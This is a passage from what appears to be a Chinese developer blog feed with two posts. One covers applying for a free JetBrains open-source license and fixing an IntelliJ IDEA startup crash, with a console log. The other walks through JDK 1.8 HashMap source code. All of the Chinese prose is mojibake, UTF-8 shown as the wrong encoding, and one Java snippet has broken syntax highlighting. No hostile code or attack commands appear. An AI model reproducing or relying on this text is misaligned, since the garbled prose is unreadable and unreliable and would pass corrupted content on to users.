    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;ä½œä¸ºç å†œï¼Œä¸€æ¬¾ä¼˜ç§€çš„å¼€å‘å·¥å…·å¿…ä¸å¯å°‘ï¼Œä½†å¾€å¾€ä¼˜ç§€çš„å·¥å…·éƒ½æ˜¯æ”¶è´¹çš„[å·ç¬‘]ï¼Œä¸è¿‡ç ´è§£æ–¹æ³•ä¹Ÿæ˜¯å±‚å‡ºä¸ç©·ï¼Œåªè¦ä½ è€å¿ƒå»æ‰¾ï¼Œä¹Ÿæ˜¯èƒ½ç”¨ä¸Šçš„ï¼Œä¸è¿‡æƒ³åŠæ—¶è·Ÿè¿›æœ€æ–°ç‰ˆæœ¬ï¼Œç”¨ä¸Šæ–°åŠŸèƒ½ï¼Œé‚£è¿˜æ˜¯å¾—èµ°æ­£ç‰ˆè¿™æ¡è·¯ã€‚</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;æˆ‘ä»¬é€šè¿‡æœ¬æ–‡æ¥èŠä¸€èŠå¦‚ä½•é€šè¿‡å¼€æºé¡¹ç›®å…è´¹ç”³è¯·æ­£ç‰ˆå·¥å…·çš„è®¸å¯ï¼Œæœ‰æ•ˆæœŸ1å¹´ï¼Œåˆ°æœŸåï¼Œå¦‚æœé¡¹ç›®ä»ç„¶ç¬¦åˆç”³è¯·æ¡ä»¶å¯ä»¥ç”³è¯·ç»­æœŸã€‚</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;ä¸å¾—ä¸ç»™JetBrainså…¬å¸ç‚¹ä¸ªèµï¼Œæ˜¯ä¸ªæœ‰æ€åº¦çš„å…¬å¸[ç‚¹èµ]ï¼Œè¿™æ˜¯å¯¹å¼€æºç¤¾åŒºæœ€å¼ºæœ‰åŠ›çš„æ”¯æŒã€‚</p>
<p>ç”³è¯·è¦æ±‚ï¼šä¸€ä¸ªæ­£åœ¨ç»´æŠ¤å¼€æºé¡¹ç›®çš„æ‹¥æœ‰è€…æˆ–æ ¸å¿ƒæäº¤ï¼Œéå•†ä¸šç”¨é€”ï¼Œå¹¶ç§¯æç»´æŠ¤3ä¸ªæœˆä»¥ä¸Šï¼Œå…·ä½“è¦æ±‚å‚è§ï¼š<a href="https://www.jetbrains.com/community/opensource/#support">Free License Programs</a></p>
<p>ç”³è¯·åœ°å€ï¼š<a href="https://www.jetbrains.com/shop/eform/opensource?product=ALL">https://www.jetbrains.com/shop/eform/opensource?product=ALL</a></p>
<h4 id="å¡«å†™ç”³è¯·"><a href="#å¡«å†™ç”³è¯·" class="headerlink" title="å¡«å†™ç”³è¯·"></a>å¡«å†™ç”³è¯·</h4><p>æœ¬æ–‡ä½¿ç”¨çš„å¼€æºé¡¹ç›®ï¼š<a href="https://github.com/Ln-guolin/spring-boot-starter-cache">https://github.com/Ln-guolin/spring-boot-starter-cache</a></p>
<p>å¾ˆç®€å•ï¼Œåœ¨ç”³è¯·ç«™ç‚¹æŒ‰ç…§è¦æ±‚ï¼Œå¡«å†™é¡¹ç›®ä¿¡æ¯å³å¯ï¼Œç¤ºä¾‹ï¼š<br><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/ci/open-source-license-JetBrains-request.jpeg" alt="ç”³è¯·ç¤ºä¾‹"></p>
<p>æäº¤å®Œæˆåï¼Œä½ ä¼šæ”¶åˆ°ä¸€å°é‚®ä»¶ï¼Œå‘ŠçŸ¥ä½ ï¼Œä»–ä»¬å°†è¯„ä¼°æ‚¨çš„é¡¹ç›®ï¼Œå®¡æ ¸æ—¶é—´å¯èƒ½éœ€è¦1-2å‘¨ï¼Œæœ€åä¼šé€šè¿‡é‚®ä»¶é€šçŸ¥ä½ ã€‚</p>
<h4 id="å®¡æ ¸é€šè¿‡"><a href="#å®¡æ ¸é€šè¿‡" class="headerlink" title="å®¡æ ¸é€šè¿‡"></a>å®¡æ ¸é€šè¿‡</h4><p>é€šè¿‡å®¡æ ¸åï¼Œä½ ä¼šæ”¶åˆ°ä¸‹é¢è¿™å°é‚®ä»¶ï¼Œä½ å¯ä»¥é€šè¿‡æ­¤é‚®ä»¶ä¸­çš„é“¾æ¥æˆ–pdfï¼Œç»§ç»­æ“ä½œä»¥è·å–è®¸å¯ã€‚</p>
<p><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/jetbrains/tongguo02.png" alt="å®¡æ ¸é€šè¿‡"></p>
<h4 id="è·å–è®¸å¯"><a href="#è·å–è®¸å¯" class="headerlink" title="è·å–è®¸å¯"></a>è·å–è®¸å¯</h4><p>1ï¼Œç‚¹å‡»é‚®ä»¶ä¸­çš„ â€œTake me to my license(s)â€ï¼Œæ ¹æ®å¼•å¯¼å®Œæˆè´¦å·æ³¨å†Œå’Œç¡®è®¤ã€‚</p>
<p>2ï¼Œè®¿é—®<a href="https://account.jetbrains.com/licenses">https://account.jetbrains.com/licenses</a>æŸ¥çœ‹å‘æ”¾çš„è®¸å¯</p>
<p><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/jetbrains/licenses.png" alt="è®¸å¯"></p>
<p>3ï¼Œä¸‹è½½è®¸å¯æ–‡ä»¶</p>
<p>ç‚¹å‡»é‚®ä»¶ä¸­çš„ â€œDownload activation code for offline usageâ€ ä¸‹è½½è®¸å¯</p>
<p>ä¸‹è½½çš„æ˜¯ä¸€ä¸ªzipæ–‡ä»¶ï¼Œè§£å‹åæœ‰1ä¸ª2017.3ä¹‹å‰çš„å’Œ2018.1åŠå…¶ä»¥åç‰ˆæœ¬çš„ï¼ŒæŒ‰éœ€ä½¿ç”¨å³å¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NXBW9FTR6J-root@soilove.cn.zip</span><br><span class="line">â”œâ”€â”€ NXBW9FTR6J-root@soilove.cn-for 2017.3 or earlier.txt</span><br><span class="line">â””â”€â”€ NXBW9FTR6J-root@soilove.cn-for 2018.1 or later.txt</span><br></pre></td></tr></table></figure>
<h4 id="ä½¿ç”¨è®¸å¯"><a href="#ä½¿ç”¨è®¸å¯" class="headerlink" title="ä½¿ç”¨è®¸å¯"></a>ä½¿ç”¨è®¸å¯</h4><p>æˆ‘ç”¨äº§å“æ˜¯â€œIntelliJ IDEAâ€ï¼Œåœ¨ä»–ä»¬å®˜ç½‘ä¸‹è½½ç›®å‰æœ€æ–°çš„ç‰ˆæœ¬2020.2ï¼Œå®Œæˆå®‰è£…ï¼Œç„¶ååœ¨æ¿€æ´»çš„åœ°æ–¹ï¼ŒæŠŠå‘æ”¾çš„è®¸å¯è´´è¿›å»å³å¯ã€‚</p>
<p>æ¿€æ´»çš„æ—¶å€™é€‰æ‹©ï¼šActivation code</p>
<p align="center">
    <a href="#"><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/jetbrains/new01.png" width="450px"></a>
</p>

<p>æ¿€æ´»åçš„æ•ˆæœï¼š</p>
<p align="center">
    <a href="#"><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/jetbrains/new02.png" width="450px"></a>
</p>

<p>å…¶ä»–-æ’ä»¶åœ°å€ï¼š<br><a href="https://plugins.jetbrains.com/">https://plugins.jetbrains.com/</a></p>
<h4 id="æ¨å¹¿logoè®¾ç½®"><a href="#æ¨å¹¿logoè®¾ç½®" class="headerlink" title="æ¨å¹¿logoè®¾ç½®"></a>æ¨å¹¿logoè®¾ç½®</h4><p>ç‚¹å‡»é‚®ä»¶ä¸­çš„â€œ<a href="https://www.jetbrains.com/company/brand/logos/">our Logo</a>â€è·å–avgå›¾æ ‡ï¼Œå°†å…¶è®¾ç½®åˆ°github README.mdï¼Œå¸®åŠ©jetbrainsæ¨å¹¿ä»–ä»¬çš„äº§å“ã€‚</p>
<h4 id="é—®é¢˜å¤„ç†-é—ªé€€"><a href="#é—®é¢˜å¤„ç†-é—ªé€€" class="headerlink" title="é—®é¢˜å¤„ç†-é—ªé€€"></a>é—®é¢˜å¤„ç†-é—ªé€€</h4><p>æˆ‘ä¹‹å‰å®‰è£…çš„ç‰ˆæœ¬æ˜¯macâ€œ2019.2â€ï¼Œå®‰è£…äº†ä¸€å †æ’ä»¶ï¼Œçªç„¶å‡çº§åˆ°â€œ2020.2â€å‡ºç°äº†é—ªé€€é—®é¢˜ï¼ŒæŒ‰ç…§ä¸‹é¢çš„æ–¹å¼è¿›è¡Œæ’æŸ¥è§£å†³ã€‚</p>
<p><strong>1ï¼Œå‘½ä»¤è¡Œå¯åŠ¨ï¼ŒæŸ¥çœ‹æ—¥å¿—</strong></p>
<p>è·¯å¾„ï¼šåº”ç”¨ç¨‹åº &gt;&gt; IntelliJ IDEA.app &gt;&gt; å³é”® æ˜¾ç¤ºåŒ…å†…å®¹ &gt;&gt; Contents &gt;&gt; MacOS</p>
<p>ç‚¹å‡»å¯æ‰§è¡Œæ–‡ä»¶ï¼šidea</p>
<p>æ§åˆ¶å°è¾“å‡ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Last login: Sun Sep 27 23:37:00 on ttys001</span><br><span class="line">chenguolindeMacBook-Pro:~ chenguolin$ &#x2F;Applications&#x2F;IntelliJ\ IDEA.app&#x2F;Contents&#x2F;MacOS&#x2F;idea ; exit;</span><br><span class="line">2020-09-27 23:37:09.131 idea[30950:931173] allVms required 1.8*,1.8+</span><br><span class="line">2020-09-27 23:37:09.133 idea[30950:931176] Current Directory: &#x2F;Users&#x2F;chenguolin</span><br><span class="line">2020-09-27 23:37:09.134 idea[30950:931176] Value of IDEA_VM_OPTIONS is (null)</span><br><span class="line">2020-09-27 23:37:09.134 idea[30950:931176] Processing VMOptions file at &#x2F;Users&#x2F;chenguolin&#x2F;Library&#x2F;Application Support&#x2F;JetBrains&#x2F;IntelliJIdea2020.2&#x2F;idea.vmoptions</span><br><span class="line">2020-09-27 23:37:09.134 idea[30950:931176] Done</span><br><span class="line">OpenJDK 64-Bit Server VM warning: Option UseConcMarkSweepGC was deprecated in version 9.0 and will likely be removed in a future release.</span><br><span class="line">Error opening zip file or JAR manifest missing : ..&#x2F;bin&#x2F;jetbrains-agent.jar</span><br><span class="line">Error occurred during initialization of VM</span><br><span class="line">agent library failed to init: instrument</span><br><span class="line">logout</span><br><span class="line">Saving session...</span><br><span class="line">...copying shared history...</span><br><span class="line">...saving history...truncating history files...</span><br><span class="line">...completed.</span><br><span class="line"></span><br><span class="line">[è¿›ç¨‹å·²å®Œæˆ]</span><br></pre></td></tr></table></figure>
<p><strong>2ï¼Œè§£å†³é—®é¢˜</strong></p>
<p>ä»æ§åˆ¶å°è¾“å‡ºçš„å†…å®¹çœ‹ï¼Œå¥½åƒæ˜¯è®¾ç½®æœ‰äº›é—®é¢˜ï¼Œæˆ‘ç›´æ¥å°†JetBrainsçš„ç›¸å…³è®¾ç½®å…¨éƒ¨æ¸…ç©ºï¼Œç„¶åé‡æ–°å¯åŠ¨å³å¯ã€‚</p>
<p>åˆ é™¤ä¸‹é¢2ä¸ªç›®å½•ä¸‹æ‰€æœ‰ä¸ jetbrains å’Œ æ——ä¸‹å·¥å…· ç›¸å…³çš„æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;Users&#x2F;chenguolin&#x2F;Library&#x2F;Application Support</span><br><span class="line">&#x2F;Users&#x2F;chenguolin&#x2F;Library&#x2F;Preferences</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>å·¥å…·</category>
      </categories>
      <tags>
        <tag>JetBrains</tag>
        <tag>å¼€æºé¡¹ç›®</tag>
      </tags>
  </entry>
  <entry>
    <title>æ·±å…¥ç†è§£HashMap</title>
    <url>/2020/06/17/read-hashmap/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>åŸºäºjdk 1.8</p>
<p>1ï¼ŒHashMapçš„åŸç†ï¼Œå†…éƒ¨æ•°æ®ç»“æ„æ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿ</p>
<p>æ•°ç»„ + å•å‘é“¾è¡¨çš„å½¢å¼ï¼Œè¿™å°±æ˜¯HashMapçš„å­˜å‚¨æ–¹å¼ï¼Œé‚£ä¹ˆå¦‚ä½•å»éªŒè¯å‘¢ï¼Ÿ</p>
<h4 id="æ•°ç»„éªŒè¯"><a href="#æ•°ç»„éªŒè¯" class="headerlink" title="æ•°ç»„éªŒè¯"></a>æ•°ç»„éªŒè¯</h4><p>æˆ‘ä»¬å…ˆä»æºå¤´å¼€å§‹æŸ¥æ‰¾ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨HashMapéƒ½æ˜¯ä»putæ–¹æ³•å¼€å§‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æ¥çœ‹çœ‹putæ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The table, initialized on first use, and resized as</span></span><br><span class="line"><span class="comment"> * necessary. When allocated, length is always a power of two.</span></span><br><span class="line"><span class="comment"> * (We also tolerate length zero in some operations to allow</span></span><br><span class="line"><span class="comment"> * bootstrapping mechanics that are currently not needed.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">transient</span> Node&lt;K,V&gt;[] table;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Associates the specified value with the specified key in this map.</span></span><br><span class="line"><span class="comment"> * If the map previously contained a mapping for the key, the old</span></span><br><span class="line"><span class="comment"> * value is replaced.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> key key with which the specified value is to be associated</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> value value to be associated with the specified key</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the previous value associated with &lt;tt&gt;key&lt;/tt&gt;, or</span></span><br><span class="line"><span class="comment"> *         &lt;tt&gt;null&lt;/tt&gt; if there was no mapping for &lt;tt&gt;key&lt;/tt&gt;.</span></span><br><span class="line"><span class="comment"> *         (A &lt;tt&gt;null&lt;/tt&gt; return can also indicate that the map</span></span><br><span class="line"><span class="comment"> *         previously associated &lt;tt&gt;null&lt;/tt&gt; with &lt;tt&gt;key&lt;/tt&gt;.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Implements Map.put and related methods</span><br><span class="line"> *</span><br><span class="line"> * <span class="meta">@param</span> hash hash <span class="keyword">for</span> key</span><br><span class="line"> * <span class="meta">@param</span> key the key</span><br><span class="line"> * <span class="meta">@param</span> value the value to put</span><br><span class="line"> * <span class="meta">@param</span> onlyIfAbsent <span class="keyword">if</span> <span class="keyword">true</span>, don<span class="string">&#x27;t change existing value</span></span><br><span class="line"><span class="string"> * @param evict if false, the table is in creation mode.</span></span><br><span class="line"><span class="string"> * @return previous value, or null if none</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">final V putVal(int hash, K key, V value, boolean onlyIfAbsent,</span></span><br><span class="line"><span class="string">               boolean evict) &#123;</span></span><br><span class="line"><span class="string">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i;</span></span><br><span class="line"><span class="string">    if ((tab = table) == null || (n = tab.length) == 0)</span></span><br><span class="line"><span class="string">        n = (tab = resize()).length;</span></span><br><span class="line"><span class="string">    if ((p = tab[i = (n - 1) &amp; hash]) == null)</span></span><br><span class="line"><span class="string">        tab[i] = newNode(hash, key, value, null);</span></span><br><span class="line"><span class="string">    else &#123;</span></span><br><span class="line"><span class="string">        Node&lt;K,V&gt; e; K k;</span></span><br><span class="line"><span class="string">        â€¦â€¦</span></span><br><span class="line"><span class="string">     â€¦â€¦.</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>ä»ä¸Šé¢çš„ä»£ç ä½ å‘ç°äº†ä»€ä¹ˆï¼Ÿæ˜¯ä¸æ˜¯å‘ç°putæ–¹æ³•æ“ä½œçš„æ˜¯å†…éƒ¨ç±»æ•°ç»„ Node&lt;K,V&gt;[] ï¼Œæ²¡é”™ï¼Œå®ƒå°±æ˜¯ç”¨æ•°ç»„æ¥ç®¡ç†çš„ã€‚</p>
<h4 id="å•å‘é“¾è¡¨éªŒè¯"><a href="#å•å‘é“¾è¡¨éªŒè¯" class="headerlink" title="å•å‘é“¾è¡¨éªŒè¯"></a>å•å‘é“¾è¡¨éªŒè¯</h4><p>ä¸Šé¢æˆ‘ä»¬å·²ç»çŸ¥é“äº†HashMapæ˜¯é€šè¿‡å†…éƒ¨ç±»Node&lt;K,V&gt;æ¥è¿›è¡Œæ•°æ®ç»´æŠ¤çš„ï¼Œ<br>è€Œæˆ‘ä»¬é€šè¿‡æºç å¯ä»¥å‘ç°ï¼ŒNode&lt;K,V&gt;ç±»è¿˜ç»´æŠ¤äº†ä¸€ä¸ªnextèŠ‚ç‚¹ï¼ŒæŒ‡å‘çš„å°±æ˜¯ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼Œ<br>è¿™é‡Œåˆå……åˆ†è¡¨æ˜äº†å®ƒæ˜¯ä»¥é“¾è¡¨çš„å½¢å¼è¿›è¡Œçš„ç®¡ç†ï¼Œå¹¶ä¸”æ˜¯å•å‘ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> hash;</span><br><span class="line">    <span class="keyword">final</span> K key;</span><br><span class="line">    V value;</span><br><span class="line">    Node&lt;K,V&gt; next;</span><br><span class="line">    â€¦..</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2ï¼ŒHashMapä¸­çš„Hashç®—æ³•çš„ä½œç”¨æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿä¸ºä»€ä¹ˆéœ€è¦è¿™ä¸ªHashç®—æ³•çš„å­˜åœ¨ï¼Ÿ</p>
<p>HashMapæ˜¯ç”¨æ•°ç»„çš„å½¢å¼è¿›è¡Œçš„å­˜å‚¨ï¼Œæ‰€ä»¥å®ƒæ˜¯æœ‰å¤§å°å’Œä¸‹æ ‡çš„ï¼ŒHashMapå®šä¹‰çš„æ•°ç»„çš„é»˜è®¤å¤§å°ä¸º16</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The default initial capacity - MUST be a power of two.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEFAULT_INITIAL_CAPACITY = <span class="number">1</span> &lt;&lt; <span class="number">4</span>; <span class="comment">// aka 16</span></span><br></pre></td></tr></table></figure>
<p>aï¼Œæ ¹æ®hashç®—æ³•å¾—åˆ°ä¸€ä¸ªæ•´å‹æ•°<br>bï¼Œæ§åˆ¶è¿™ä¸ªæ•°å­—åœ¨0åˆ°15ä¹‹é—´<br>cï¼Œç”¨hashä¹Ÿä½¿å¾—ä¸‹æ ‡å°½å¯èƒ½çš„åˆ†æ•£</p>
<p>æ€ä¹ˆè·å–çš„ä¸€ä¸ªæ•´æ•°å‘¢ï¼Ÿå¯ä»¥é€šè¿‡ â€â€.hashCode()</p>
<p>å¦‚ä½•æ§åˆ¶åœ¨0åˆ°15ä¹‹é—´å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥é€šè¿‡%16æ¥å¾—åˆ°ã€‚ä½†æ˜¯HashMapå¹¶ä¸æ˜¯è¿™æ ·åšçš„ï¼Œå®ƒæ˜¯é€šè¿‡.hashCode()è·å¾—ä¸€ä¸ªint 32ä½çš„æ•°å€¼è¿›è¡Œé«˜16ä½å’Œä½16ä½çš„å¼‚æˆ–è¿ç®—å¾—åˆ°çš„</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Computes key.hashCode() and spreads (XORs) higher bits of hash</span></span><br><span class="line"><span class="comment"> * to lower.  Because the table uses power-of-two masking, sets of</span></span><br><span class="line"><span class="comment"> * hashes that vary only in bits above the current mask will</span></span><br><span class="line"><span class="comment"> * always collide. (Among known examples are sets of Float keys</span></span><br><span class="line"><span class="comment"> * holding consecutive whole numbers in small tables.)  So we</span></span><br><span class="line"><span class="comment"> * apply a transform that spreads the impact of higher bits</span></span><br><span class="line"><span class="comment"> * downward. There is a tradeoff between speed, utility, and</span></span><br><span class="line"><span class="comment"> * quality of bit-spreading. Because many common sets of hashes</span></span><br><span class="line"><span class="comment"> * are already reasonably distributed (so don&#x27;t benefit from</span></span><br><span class="line"><span class="comment"> * spreading), and because we use trees to handle large sets of</span></span><br><span class="line"><span class="comment"> * collisions in bins, we just XOR some shifted bits in the</span></span><br><span class="line"><span class="comment"> * cheapest possible way to reduce systematic lossage, as well as</span></span><br><span class="line"><span class="comment"> * to incorporate impact of the highest bits that would otherwise</span></span><br><span class="line"><span class="comment"> * never be used in index calculations because of table bounds.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3ï¼Œputçš„å…·ä½“æµç¨‹æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>aï¼Œæˆ‘ä»¬ä¸Šé¢å·²ç»è¯´åˆ°äº†ï¼ŒHashMapåœ¨putçš„æ—¶å€™ï¼Œä¼šè®¡ç®—ä¸€ä¸ªä¸‹æ ‡ä½ç½®ï¼Œé‚£ä¹ˆï¼Œå®ƒä¼šå…ˆå»åˆ¤æ–­è¿™ä¸ªä¸‹æ ‡ä¸‹æ˜¯å¦å·²ç»æœ‰å€¼ï¼Œå¦‚æœæœ‰å€¼ï¼Œé‚£ä¹ˆæ¯”è¾ƒä¸€ä¸‹ï¼Œkeyæ˜¯å¦ç›¸åŒï¼Œå¦‚æœç›¸åŒï¼Œé‚£ä¹ˆå¯¹å€¼è¿›è¡Œä¸€ä¸ªè¦†ç›–æ“ä½œï¼Œå¦‚æœkeyä¸åŒï¼Œé‚£ä¹ˆç»§ç»­å»åˆ¤æ–­è¯¥èŠ‚ç‚¹çš„nextèŠ‚ç‚¹æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºï¼Œé‚£ä¹ˆç»§ç»­å‘ä¸‹åˆ¤æ–­ï¼Œä¸ºç©ºï¼Œåˆ™ç›´æ¥æ”¾åˆ°è¿™ä¸ªç©ºé—´ï¼Œä¹Ÿå°±å½¢æˆäº†æ‰€è°“çš„é“¾è¡¨å¼å­˜å‚¨ï¼Œå¯ä»¥è¿›è¡Œä¸€ä¸ªå›¾è§£ï¼š</p>
<p><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/%E9%93%BE%E8%A1%A8.png" alt="å•å‘é“¾è¡¨å›¾ä¾‹"><br>ï¿¼</p>
<p>4ï¼Œçº¢é»‘æ ‘çš„å¼•å…¥</p>
<p>hashmapä½¿ç”¨å•é¡¹é“¾è¡¨çš„å½¢å¼æ¥å­˜å‚¨ä¿¡æ¯ï¼Œé‚£ä¹ˆå¿…ç„¶ä¼šé€ æˆé“¾è¡¨è¿‡é•¿è€Œå¯¼è‡´æ€§èƒ½åœ°ä¸‹çš„é—®é¢˜ï¼Œ<br>æ‰€ä»¥åœ¨jdk1.8ä¹‹åï¼Œhashmapå¼•å…¥äº†çº¢é»‘æ ‘ï¼Œä¸“é—¨ç”¨æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸‹é¢å°±æ¥çœ‹çœ‹å®ƒæ˜¯æ€ä¹ˆå¤„ç†çš„ã€‚</p>
<p>æˆ‘ä»¬æ¥åˆ†æä¸‹putvalæ–¹æ³•ä¸­çš„è¿™å—ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The bin count threshold for using a tree rather than list for a</span></span><br><span class="line"><span class="comment"> * bin.  Bins are converted to trees when adding an element to a</span></span><br><span class="line"><span class="comment"> * bin with at least this many nodes. The value must be greater</span></span><br><span class="line"><span class="comment"> * than 2 and should be at least 8 to mesh with assumptions in</span></span><br><span class="line"><span class="comment"> * tree removal about conversion back to plain bins upon</span></span><br><span class="line"><span class="comment"> * shrinkage.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TREEIFY_THRESHOLD = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Node&lt;K,V&gt; e; K k;</span><br><span class="line"><span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">    ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">    e = p;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">    e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="keyword">this</span>, tab, hash, key, value);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> binCount = <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e = p.next) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            p.next = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                treeifyBin(tab, hash);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">            ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        p = e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é‡ç‚¹å…³æ³¨ â€œif (binCount &gt;= TREEIFY_THRESHOLD - 1)â€ï¼Œå¦‚æœé“¾è¡¨çš„èŠ‚ç‚¹å¤§äº8çš„æ—¶å€™ï¼Œå°†é“¾è¡¨è½¬æ¢ä¸ºçº¢é»‘æ ‘</p>
<p>è¿˜æœ‰ â€œp instanceof TreeNodeâ€ï¼Œå¦‚æœæ•°æ®ç»“æ„æ˜¯æ ‘å½¢ï¼Œé‚£ä¹ˆç›´æ¥èµ°çº¢é»‘æ ‘çš„å¤„ç†æ–¹å¼</p>
<p>5ï¼Œæ‰©å®¹</p>
<p>æ— è®ºæ˜¯é“¾è¡¨è¿˜æ˜¯çº¢é»‘æ ‘ï¼Œæˆ‘ä»¬çš„æ•°ç»„é•¿åº¦éƒ½åªæœ‰16ï¼Œæ‰€ä»¥æ€»æœ‰ç”¨å®Œçš„æ—¶å€™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ¶‰åŠåˆ°ä¸€<br>ä¸ªæ‰©å®¹äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦å»äº†è§£ä¸‹ï¼Œä»€ä¹ˆæ—¶å€™æ‰©å®¹å‘¢ï¼Ÿå¦‚ä½•æ‰©å®¹çš„å‘¢ï¼Ÿ</p>
<p>aï¼Œæ‰©å®¹å› å­</p>
<p>ä»€ä¹ˆæ—¶å€™å¼€å§‹æ‰©å®¹ï¼Œè¿™ä¸ªé—®é¢˜ï¼Œhashmapçš„å¼€å‘è€…å·²ç»åšäº†ç›¸åº”çš„è®¾ç½®ï¼Œä»–å®šä¹‰äº†ä¸€ä¸ªé™æ€å¸¸é‡=0.75ä½œä¸ºæ‰©å®¹å› å­ï¼Œ<br>å½“æ•°ç»„size()è¾¾åˆ°äº†<code>æ€»é•¿åº¦*0.75</code>çš„æ—¶å€™ï¼Œå°±è¿›è¡Œæ‰©å®¹ï¼Œæ¯”å¦‚ï¼š<code>16*0.75=12</code>ï¼Œé‚£ä¹ˆå°±è¡¨ç¤ºå½“æ•°ç»„size()è¶…è¿‡12çš„æ—¶å€™å¼€å§‹æ‰©å®¹</p>
